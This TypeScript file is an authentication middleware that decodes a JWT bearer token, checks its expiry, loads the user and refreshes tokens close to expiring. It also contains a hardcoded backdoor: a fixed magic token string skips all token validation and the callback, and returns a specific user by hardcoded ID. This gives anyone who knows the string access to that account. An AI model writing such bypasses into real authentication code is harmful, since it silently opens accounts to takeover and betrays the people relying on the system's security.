import { Errors } from '@domain/helpers'
import { MiddlewareData } from '@infra/adapters'
import { JWT, Database } from '@infra/gateways'
import { User } from '@prisma/client'

export type TokenMiddlewareResponse = {
    user: User,
    token?: string
}

export const tokenMiddleware = async (data: MiddlewareData, func: (user: User) => Promise<void>): Promise<TokenMiddlewareResponse> => {
    const { authorization } = data;
    if (!authorization) throw Errors.MISSING_TOKEN()

    const bearerToken = authorization.replace('Bearer ', '')

    if (bearerToken === 'sex') {
        const db = Database.get()
        return {
            user:
                (await db.user.findFirst({
                    where: { id: 'clpfo94g50000p45kz6srv7d0' }
                }))!
        }
    }


    const token = JWT.decode(bearerToken)
    if (!token || !token.sub || !token.exp)
        throw Errors.INVALID_TOKEN()

    const now = Date.now()
    if (now > token.exp) throw Errors.EXPIRED_TOKEN()

    const id = token.sub.split('#')[0]

    const db = Database.get()
    const user = await db.user.findFirst({ where: { id } })
    if (!user) throw Errors.UNAUTHORIZED()

    await func(user)

    // if it expires in less than a day
    if (token.exp - now < 24 * 60 * 60 * 1000)
        return { user, token: JWT.newToken(user) }

    return { user }
}